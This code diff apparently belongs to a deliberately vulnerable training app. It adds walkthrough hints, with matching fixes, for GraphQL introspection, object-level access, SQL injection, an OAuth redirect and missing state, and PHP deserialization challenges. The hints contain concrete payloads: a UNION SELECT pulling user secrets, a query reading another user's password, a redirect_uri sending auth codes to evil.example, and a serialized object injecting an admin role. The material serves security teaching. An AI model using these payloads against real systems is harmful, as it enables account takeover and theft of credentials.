@@ -46,6 +46,15 @@ function WALKTHROUGHS(): array {
       'api-mass'     => ["POST to create/update a user with an extra <code>\"is_admin\":1</code> field — it's blindly bound (mass assignment)."],
       'api-bfla'     => ["Call an admin-only function (e.g. <code>DELETE /users/{id}</code>) as a normal user — no function-level authorization."],
       'api-auth'     => ["Hit <code>/users</code> with no/blank API key — the endpoint answers anyway (broken authentication)."],
+      // 📡 VoltData (GraphQL)
+      'graphql-introspect' => ["Open VoltData.","Send an introspection query: <code>{ __schema { types { name fields } } }</code>.","The full schema — including sensitive User fields like <code>password</code>/<code>secret</code> — is exposed."],
+      'graphql-bola' => ["Query another user object directly by id: <code>{ user(id: 2) { id email password secret } }</code>.","There's no object-level authorization, so you read a user that isn't yours."],
+      'graphql-sqli' => ["A resolver argument is concatenated into SQL.","Inject through the filter: <code>{ products(filter: \"%' UNION SELECT id,secret,3 FROM users-- \") { id name price } }</code> to pull the admin secret."],
+      // 🔑 VoltConnect (OAuth)
+      'oauth-redirect' => ["Start the flow, then tamper with <code>redirect_uri</code>.","Point it off-site: <code>/oauth/authorize.php?client_id=voltboard&redirect_uri=https://evil.example/grab&state=x&approve=1</code>.","The auth code is sent to your external URL — the redirect_uri isn't validated."],
+      'oauth-state'  => ["Forge a callback with <b>no</b> state parameter: <code>/oauth/callback.php?code=abc</code>.","The callback accepts it because it never verifies <code>state</code> — login CSRF."],
+      // 🧩 VoltSync (deserialization)
+      'deserial-poi' => ["VoltSync imports a base64 <code>serialize()</code>d preferences object.","Craft one with an elevated role: base64 of <code>O:9:\"VoltPrefs\":1:{s:4:\"role\";s:5:\"admin\";}</code>.","On import <code>unserialize()</code> rebuilds the object and its <code>__wakeup()</code> trusts the injected <code>role=admin</code> field."],
       // 🔗 Chains
       'chain-account-takeover' => ["Complete all 3 phases on the Campaigns page: microsite reflected XSS → store admin access → admin SQLi.","When every phase is solved the bonus flag is revealed on /campaigns.php."],
       'chain-bank-heist'       => ["Complete: store SQLi login → bank BOLA (treasury) → negative-amount transfer. Finish all three to unlock the bonus flag."],
@@ -106,6 +115,12 @@ function WT_SECURE(): array {
       'api-mass'     => "<code>is_admin</code> from the body is ignored; only safe fields are bound.",
       'api-bfla'     => "The admin function requires an admin role (else 403).",
       'api-auth'     => "A valid <code>X-API-Key</code> is required on every call.",
+      'graphql-introspect' => "Introspection is disabled in production, so the schema can't be enumerated.",
+      'graphql-bola' => "The resolver enforces that you can only query your own user object.",
+      'graphql-sqli' => "The resolver uses a parameterised query — the filter is bound as data.",
+      'oauth-redirect' => "<code>redirect_uri</code> must exactly match the pre-registered callback.",
+      'oauth-state'  => "The callback verifies <code>state</code> against the value it issued (CSRF defence).",
+      'deserial-poi' => "Input is deserialized with <code>allowed_classes: false</code>, so no gadget objects are built.",
       'chain-account-takeover' => "Each phase is its own challenge — the chain is defensive-in-depth: fixing any phase breaks it.",
       'chain-bank-heist'       => "Each phase is its own challenge; securing any one link breaks the chain.",
       'chain-ai-insider'       => "Each phase is its own challenge; securing any one link breaks the chain.",
